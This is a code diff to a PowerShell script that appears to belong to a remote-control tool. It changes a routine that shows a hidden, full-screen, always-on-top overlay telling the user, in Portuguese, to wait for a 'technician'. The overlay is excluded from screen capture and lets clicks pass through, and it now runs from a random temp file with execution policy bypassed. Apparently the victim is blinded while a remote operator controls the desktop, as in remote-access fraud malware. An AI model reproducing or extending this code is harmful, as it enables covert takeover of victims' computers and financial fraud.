@@ -112,6 +112,7 @@ $Global:run = $true
 $Global:panel = $false
 $Global:locked = $false
 $Global:lockProcess = $null
+$Global:lockFile = $null
 $Global:scale = 0.6
 $Global:quality = 50
 
@@ -220,37 +221,40 @@ public class LockAPI {
     public static extern int SetWindowLong(IntPtr hwnd, int index, int value);
 }
 '@
-`$form = New-Object Windows.Forms.Form
-`$form.FormBorderStyle = 'None'
-`$form.StartPosition = 'Manual'
-`$form.Location = [Drawing.Point]::new(0, 0)
-`$form.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
-`$form.TopMost = `$true
-`$form.BackColor = [Drawing.Color]::FromArgb(10, 10, 15)
-`$form.ShowInTaskbar = `$false
-`$title = New-Object Windows.Forms.Label
-`$title.Text = '$msg'
-`$title.Font = New-Object Drawing.Font('Segoe UI', 36, [Drawing.FontStyle]::Bold)
-`$title.ForeColor = [Drawing.Color]::White
-`$title.AutoSize = `$true
-`$sub = New-Object Windows.Forms.Label
-`$sub.Text = 'Por favor, aguarde o tecnico liberar a tela.'
-`$sub.Font = New-Object Drawing.Font('Segoe UI', 16)
-`$sub.ForeColor = [Drawing.Color]::Gray
-`$sub.AutoSize = `$true
-`$form.Controls.Add(`$title)
-`$form.Controls.Add(`$sub)
-`$form.Add_Load({
-    `$title.Location = [Drawing.Point]::new((`$form.Width - `$title.Width) / 2, `$form.Height / 2 - 50)
-    `$sub.Location = [Drawing.Point]::new((`$form.Width - `$sub.Width) / 2, `$form.Height / 2 + 20)
-    [LockAPI]::SetWindowDisplayAffinity(`$form.Handle, 0x11) | Out-Null
-    `$style = [LockAPI]::GetWindowLong(`$form.Handle, -20)
-    [LockAPI]::SetWindowLong(`$form.Handle, -20, `$style -bor 0x80000 -bor 0x20) | Out-Null
+`$f = New-Object Windows.Forms.Form
+`$f.FormBorderStyle = 'None'
+`$f.StartPosition = 'Manual'
+`$f.Location = [Drawing.Point]::new(0, 0)
+`$f.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
+`$f.TopMost = `$true
+`$f.BackColor = [Drawing.Color]::FromArgb(10, 10, 15)
+`$f.ShowInTaskbar = `$false
+`$t = New-Object Windows.Forms.Label
+`$t.Text = '$msg'
+`$t.Font = New-Object Drawing.Font('Segoe UI', 36, [Drawing.FontStyle]::Bold)
+`$t.ForeColor = [Drawing.Color]::White
+`$t.AutoSize = `$true
+`$s = New-Object Windows.Forms.Label
+`$s.Text = 'Por favor, aguarde o tecnico liberar a tela.'
+`$s.Font = New-Object Drawing.Font('Segoe UI', 16)
+`$s.ForeColor = [Drawing.Color]::Gray
+`$s.AutoSize = `$true
+`$f.Controls.Add(`$t)
+`$f.Controls.Add(`$s)
+`$f.Add_Shown({
+    `$t.Location = [Drawing.Point]::new((`$f.Width - `$t.Width) / 2, `$f.Height / 2 - 50)
+    `$s.Location = [Drawing.Point]::new((`$f.Width - `$s.Width) / 2, `$f.Height / 2 + 20)
+    [LockAPI]::SetWindowDisplayAffinity(`$f.Handle, 17)
+    `$st = [LockAPI]::GetWindowLong(`$f.Handle, -20)
+    [LockAPI]::SetWindowLong(`$f.Handle, -20, `$st -bor 0x80000 -bor 0x20)
 })
-[Windows.Forms.Application]::Run(`$form)
+[Windows.Forms.Application]::Run(`$f)
 "@
 
-    $Global:lockProcess = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$code`"" -PassThru -WindowStyle Hidden
+    $lockFile = "$env:TEMP\lock_$(Get-Random).ps1"
+    $code | Out-File -FilePath $lockFile -Encoding UTF8
+    $Global:lockProcess = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$lockFile`"" -PassThru -WindowStyle Hidden
+    $Global:lockFile = $lockFile
 }
 
 function Unlock {
@@ -260,6 +264,11 @@ function Unlock {
         try { $Global:lockProcess.Kill() } catch {}
         try { $Global:lockProcess.Dispose() } catch {}
         $Global:lockProcess = $null
+    }
+
+    if ($Global:lockFile -and (Test-Path $Global:lockFile)) {
+        try { Remove-Item $Global:lockFile -Force } catch {}
+        $Global:lockFile = $null
     }
 
     $Global:locked = $false
